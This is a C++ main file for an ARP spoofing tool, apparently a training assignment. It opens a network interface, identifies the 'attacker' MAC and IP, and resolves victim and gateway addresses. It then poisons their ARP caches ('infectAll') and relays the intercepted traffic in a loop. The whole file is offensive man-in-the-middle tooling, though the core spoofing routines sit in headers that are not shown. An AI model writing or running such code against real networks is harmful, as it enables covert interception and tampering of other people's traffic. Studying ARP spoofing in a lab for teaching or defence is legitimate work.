#include <cstdio>
#include <cstdlib>
#include <vector>
#include <pcap.h>

#include "arpspoofmanager.h"
#include "netinfo.h"

void usage() {
    std::printf("syntax: arp-spoof <interface> <sender ip 1> <target ip 1> [<sender ip 2> <target ip 2> ...]\n");
    std::printf("sample: arp-spoof wlan0 192.168.10.2 192.168.10.1\n");
}

int main(int argc, char* argv[]) {
    if (argc < 4 || ((argc - 2) % 2) != 0) {
        usage();
        return EXIT_FAILURE;
    }

    char* dev = argv[1];
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* pcap = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
    if (pcap == nullptr) {
        std::fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
        return EXIT_FAILURE;
    }

    Mac attackerMac;
    Ip attackerIp;
    if (!getAttackerInfo(dev, attackerMac, attackerIp)) {
        pcap_close(pcap);
        return EXIT_FAILURE;
    }

    ArpSpoofManager manager(pcap, attackerMac, attackerIp);
    std::vector<SpoofSession> sessions;
    for (int i = 2; i < argc; i += 2) {
        SpoofSession session{Ip(argv[i]), Mac(), Ip(argv[i + 1]), Mac()};
        if (!manager.initializeSession(session)) {
            std::fprintf(stderr, "failed to resolve mac addresses for %s -> %s\n", argv[i], argv[i + 1]);
            pcap_close(pcap);
            return EXIT_FAILURE;
        }
        sessions.push_back(session);
    }

    if (!manager.infectAll(sessions)) {
        pcap_close(pcap);
        return EXIT_FAILURE;
    }

    std::printf("initial infection complete for %zu flow(s)\n", sessions.size());
    manager.relayLoop(sessions);

    pcap_close(pcap);
    return EXIT_SUCCESS;
}
